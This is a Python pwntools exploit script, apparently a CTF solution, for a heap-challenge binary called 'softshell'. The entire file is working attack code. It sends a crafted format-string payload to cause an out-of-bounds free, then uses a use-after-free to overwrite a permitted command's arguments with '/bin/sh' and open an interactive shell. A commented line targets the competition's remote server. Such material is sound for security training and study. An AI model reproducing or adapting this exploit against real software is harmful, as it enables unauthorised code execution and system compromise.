#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template softshell
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('softshell')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

def add(command,tag):
    io.sendlineafter(b'>> ',str(1).encode())
    io.sendlineafter(b'>>',command)
    io.sendlineafter(b'>>',tag)
    return
def view(cmd_index,index):
    io.sendlineafter(b'>> ',str(2).encode())
    io.sendlineafter(b'>> ',str(cmd_index).encode())
    io.sendlineafter(b'>> ',str(index).encode())
    return
def delt(index):
    io.sendlineafter(b'>> ',str(5).encode())
    io.sendlineafter(b'>> ',str(index).encode())
    return
def edit_tag(index,tag):
    io.sendlineafter(b'>> ',str(3).encode())
    io.sendlineafter(b'>> ',str(index).encode())
    io.sendlineafter(b'>>',tag)
    return
def run(index):
    io.sendlineafter(b'>>',str(4).encode())
    io.sendlineafter(b'>>',str(index).encode())
    return


poc = b'a'+16*b' '+b'%b'

tag = b'a'*15

io = start()
#io = remote('chal.pctf.competitivecyber.club' ,8888)

for i in range(5):
    add(poc,tag+str(i).encode()) #create chunks and trigger oob vulnerability

delt(0) # oob free and put tag chunk into fustbins
delt(1) #
delt(2) #
delt(3) #
add(b'/usr/games/cowsay moooo',b'A'*0x30) #add chunk with allowed username
 
edit_tag(1,b'-') #edit arguments via use after free

edit_tag(2,b'/bin/sh') #edit argument via use after free

run(5) #run shell

io.interactive()

